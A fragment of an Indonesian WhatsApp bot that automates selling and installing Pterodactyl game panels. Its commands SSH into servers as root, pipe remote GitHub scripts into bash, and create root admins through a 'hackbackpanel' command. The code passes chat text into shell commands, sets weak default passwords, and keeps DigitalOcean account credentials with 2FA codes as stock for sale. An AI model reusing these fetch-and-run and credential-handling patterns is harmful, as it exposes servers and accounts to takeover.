if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Tama Offc\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("Tama|ipserver"))
if (!text.split("|")) return m.reply(example("Tama|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cadp': {
 if (!isOwner) return m.reply(mess.Owner)

 let s = q.split(',');
 if (s.length < 2) return m.reply(`*Format salah!*\nPenggunaan: ${prefix + command} user,nomer, pilih salah satu 1/2/3`);

 let username = s[0];
 let nomor = s[1];
 let serverChoice = s[2]; // Pilihan server: 'server1', 'server2', atau 'server_prib'

 if (!username) return m.reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`);
 if (!nomor) return m.reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`);
 if (!serverChoice) return m.reply(`Pilih server tempat admin panel dibuat: 1, 2, 3 ( Pribadi )`);

 let password = username + "123";
 let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

 // Tentukan domain dan apikey berdasarkan server yang dipilih
 let serverConfig;
 switch (serverChoice.toLowerCase()) {
 case '1':
 serverConfig = { domain: global.domain, apikey: global.apikey };
 break;
 case '2':
 serverConfig = { domain: global.domain2, apikey: global.apikey2 };
 break;
 case '3':
 serverConfig = { domain: global.domain_prib, apikey: global.apikey_prib };
 break;
 default:
 return reply(`Server yang dipilih tidak valid. Pilih antara 'server1', 'server2', atau 'server_prib'.`);
 }

 // Buat admin panel di server yang dipilih
 let f = await fetch(`${serverConfig.domain}/api/application/users`, {
 "method": "POST",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${serverConfig.apikey}`
 },
 "body": JSON.stringify({
 "email": username + "@gmail.com",
 "username": username,
 "first_name": username,
 "last_name": "Memb",
 "language": "en",
 "root_admin": true,
 "password": password.toString()
 })
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;
 let tks = `
*Admin Panel berhasil dibuat* ✅\n*Created By:* メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID

┏━ ⬣『 *DATA AKUN* 』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃📡ID : ${user.id}
┃👤USERNAME : ${user.username}
┃📬EMAIL : ${user.email}
┃🦖NAME : ${user.first_name} ${user.last_name}
┃🔥LANGUAGE : ${user.language}
┃📊ADMIN : ${user.root_admin}
┃☢️CREATED AT : ${user.created_at}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛`;
 const listMessage = {
 text: tks,
 };

 await conn.sendMessage(m.chat, listMessage);

 // Kirim data admin panel ke nomor WhatsApp yang dipilih
 await conn.sendMessage(nomornya, {
 text: `*Woi Kontol Ini Data Admin Panel Lu !!*
 *Created By:* メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID
 
 ┏━ ⬣『 *DATA AKUN*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ 👤USERNAME : ${username}
┃🔑PASSWORD : ${password}
┃ 🌐LOGIN : ${serverConfig.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN, MOHON DI SIMPAN BAIK-BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*

メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
 });

}
 break;
 
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cadp2': {
if (!isOwner) return Reply(mess.owner)
    // Pastikan ada input username dan server
    let s = q.split(',');
    if (s.length < 2) return Reply(`⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝘀𝗮𝗹𝗮𝗵! 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻: ${prefix + command} username,server\n\n𝗖𝗼𝗻𝘁𝗼𝗵: ${prefix + command} user123,server1`);

    let username = s[0].trim();
    let serverChoice = s[1].trim().toLowerCase();

    if (!m.quoted) {
        return Reply(`⚠️ 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗿𝗲𝗽𝗹𝗶 𝗽𝗲𝘀𝗮𝗻 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮 𝘆𝗮𝗻𝗴 𝗮𝗸𝗮𝗻 𝗱𝗶𝗯𝘂𝗮𝘁𝗸𝗮𝗻 𝗮𝗸𝘂𝗻 𝗱𝗲𝗻𝗴𝗮𝗻 𝗺𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵.`);
    }

    // Ambil nomor dari pesan yang dibalas
    let target = m.quoted.sender;
    let targetNumber = target.split('@')[0];
    if (!targetNumber) {
        return reply(`⚠️ 𝗡𝗼𝗺𝗼𝗿 𝘁𝗶𝗱𝗮𝗸 𝗯𝗶𝘀𝗮 𝗱𝗶𝗮𝗺𝗯𝗶𝗹. 𝗣𝗮𝘀𝘁𝗶𝗸𝗮𝗻 𝗽𝗲𝘀𝗮𝗻 𝘆𝗮𝗻𝗴 𝗱𝗶𝗯𝗮𝗹𝗮𝘀 𝗱𝗶𝗸𝗶𝗿𝗶𝗺 𝗼𝗹𝗲𝗵 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮.`);
    }

    // Pilih server berdasarkan input
    let serverConfig;
    switch (serverChoice) {
        case 'server1':
            serverConfig = { domain: global.domain, apikey: global.apikey };
            break;
        case 'server2':
            serverConfig = { domain: global.domainV2, apikey: global.apikeyV2 };
            break;
        case 'server3':
            serverConfig = { domain: global.domainV3, apikey: global.apikeyV3 };
            break;
        default:
            return Reply(`⚠️ 𝗣𝗶𝗹𝗶𝗵𝗮𝗻 𝘀𝗲𝗿𝘃𝗲𝗿 𝘁𝗶𝗱𝗮𝗸 𝘃𝗮𝗹𝗶𝗱. 𝗣𝗶𝗹𝗶𝗵: server1, server2, atau server3`);
    }

    // Buat password
    let password = crypto.randomBytes(7).toString('hex');

    // Request ke server API untuk membuat akun
    let f = await fetch(`${serverConfig.domain}/api/application/users`, {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": `Bearer ${serverConfig.apikey}`
        },
        body: JSON.stringify({
            email: username + "@tama.srvdev",
            username: username,
            first_name: username,
            last_name: "Member",
            language: "en",
            root_admin: true,
            password: password
        })
    });

    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

    let user = data.attributes;

    // Kirim informasi ke grup atau pengirim
    let tks = `
┏━━━ *𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟* ━━━┓
┃  
┃   👤 *𝗨𝘀𝗲𝗿 𝗜𝗗*   : ${user.id}
┃   🌐 *𝗨𝗨𝗜𝗗*      : ${user.uuid}
┃   📛 *𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲*  : ${user.username}
┃   ✉️ *𝗘𝗺𝗮𝗶𝗹*     : ${user.email}
┃   🦸 *𝗔𝗱𝗺𝗶𝗻*     : ${user.root_admin ? '𝗬𝗮' : '𝗧𝗶𝗱𝗮𝗸'}
┃   📆 *𝗖𝗿𝗲𝗮𝘁𝗲𝗱*  : ${user.created_at}
┃  
┗━━━━━━━━━━━━━━━━━━━┛`;

    await conn.sendMessage(m.chat, { text: tks });

    // Kirim kredensial ke nomor yang dibalas
    await conn.sendMessage(target + "@s.whatsapp.net", {
        text: `
*💻 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗖𝗖𝗢𝗨𝗡𝗧*

👤 *𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 :* ${username}
📱 *𝗡𝗼𝗺𝗼𝗿 :* ${targetNumber}
🔑 *𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 :* ${password}
🌐 *𝗟𝗼𝗴𝗶𝗻 :* ${serverConfig.domain}

📌 *𝗡𝗼𝘁𝗲*: *𝗦𝗮𝘃𝗲 𝘆𝗼𝘂𝗿 𝗰𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀, 𝗻𝗼 𝗿𝗲𝘀𝗲𝗻𝗱𝘀 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗶𝘀𝘀𝘂𝗲𝗱.*

メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID
        `
    });

    break;
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'adm': {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply(example("📝 username"));

  let username = text
  let email = username + "@g.us";
  let name = capital(args[0]);
  let password = username + "faanzstore";

  let f = await fetch(domain + "/api/application/users", {
      "method": "POST",
      "headers": {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "Authorization": "Bearer " + apikey
      },
      "body": JSON.stringify({
          "email": email,
          "username": username.toLowerCase(),
          "first_name": name,
          "last_name": "Admin",
          "root_admin": true,
          "language": "en",
          "password": password
      })
  });

  let data = await f.json();
  if (data.errors) return Reply("❌ Error: " + JSON.stringify(data.errors[0], null, 2));

  let user = data.attributes;
  var orang;

  if (m.isGroup) {
      orang = m.sender;
      await Reply("✅ *Berhasil membuat admin panel!* \nData akun sudah dikirim ke private chat.");
  } else {
      orang = m.chat;
  }

  var teks = `
*✅ Berhasil Membuat Admin Panel!*

*🔑 ID User:* ${user.id}
*👤 Nama:* ${user.first_name}
*💻 Username:* ${user.username}
*🔒 Password:* ${password}
*🌐 Login:* ${global.domain}

*📜 Rules Admin Panel ⚠️:*
1️⃣ Jangan Maling SC, Ketahuan Maling? Auto Delete Akun & No Reff!!
2️⃣ Simpan Baik-Baik Data Akun Ini
3️⃣ Buat Panel Seperlunya Aja, Jangan Asal Buat!
4️⃣ Garansi Aktif 30 Hari
5️⃣ Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`;

  await conn.sendMessage(orang, { text: teks }, { quoted: qlocJpm });
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addstok": case "adddo": case "addstokdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("tama@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
if (!text.split("|")) return m.reply(example("tama@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
const cek = text.split("|")
if (cek.length < 5) return m.reply(example("tama@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
let [email, pw, kode2fa, reff, droplet, harga] = text.split("|")
stokdo.push({
email: email, 
password: pw, 
kode2fa: kode2fa, 
referall: reff, 
droplet: droplet, 
harga: Number(harga)
})
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menambah data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "adm2": {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply(example("📝 username"))
    
    let username = text
    let email = username + "@g.us"
    let name = capital(args[0])
    let password = username + "メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ"
    
    let f = await fetch(domain2 + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password.toString()
        })
    })
    
    let data = await f.json();
    if (data.errors) return Reply("❌ Error: " + JSON.stringify(data.errors[0], null, 2))
    
    let user = data.attributes
    var orang
    
    if (m.isGroup) {
        orang = m.sender
        await Reply("✅ *Berhasil membuat admin panel!* \nData akun sudah dikirim ke private chat.")
    } else {
        orang = m.chat
    }
    
    var teks = `
*✅ Berhasil Membuat Admin Panel!*

*🔑 ID User:* ${user.id}
*👤 Nama:* ${user.first_name}
*💻 Username:* ${user.username}
*🔒 Password:* ${password.toString()}
*🌐 Login:* ${global.domain2}

*📜 Rules Admin Panel ⚠️:*
1️⃣ Jangan Maling SC, Ketahuan Maling? Auto Delete Akun & No Reff!!
2️⃣ Simpan Baik-Baik Data Akun Ini
3️⃣ Buat Panel Seperlunya Aja, Jangan Asal Buat!
4️⃣ Garansi Aktif 30 Hari
5️⃣ Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await conn.sendMessage(orang, { text: teks }, { quoted: qlocJpm })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delstok": case "delstokdo": case "deldo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return m.reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return m.reply(example("idnya\n\nKetik *.liststok* untuk lihat id"))
if (Number(text) > stokdo.length) return m.reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menghapus data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "liststok": case "liststokdo": case "listdo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
//if (m.isGroup) return Reply(mess.private)
let messageText = "\n *── List stok akun digital ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return m.reply(messageText)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addakses": case "addaksesgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
const input = m.chat
if (premium.includes(input)) return m.reply(`Grup ini sudah di beri akses reseller panel!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listakses": case "listaksesgc": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all grup reseller panel*\n`
for (let i of premium) {
let name = (await conn.groupMetadata(i)).subject || "Tidak ditemukan"
teks += `\n* ${i}
* *Nama :* ${name}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delakses": case "delaksesgc": {
if (!isCreator) return Reply(mess.owner)
if (premium.length < 1) return m.reply("Tidak ada grup reseller panel")
if (!text) {
let list = []
for (let i of premium) {
let name = (await conn.groupMetadata(i)).subject || "Tidak ditemukan"
list.push({
title: `${name}`, 
description: i, 
id: `.${command} ${i}`
})
}
list.push({
title: `All Group Reseller`, 
description: "All group reseller", 
id: `.${command} all`
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let input = text
if (text == "all") {
await premium.splice(0, premium.length)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
return m.reply(`Berhasil menghapus semua grup reseller panel ✅`)
}
if (!premium.includes(input)) return m.reply(`Grup ini bukan grup reseller panel!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'updomain': {
    const newDomain = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newDomain) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} domain.com`);
    }

    global.domain = newDomain; // Update domain global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`✨ *Domain Panel Berhasil Diganti!*\n\n🌐 Domain baru: *${newDomain}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan Domain*\n\n🌐 Domain telah diganti:\n- *Domain Baru*: ${newDomain}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

case 'upapikey': {
    const newApiKey = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newApiKey) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} ApiKeyBaru123`);
    }

    global.apikey = newApiKey; // Update API key global
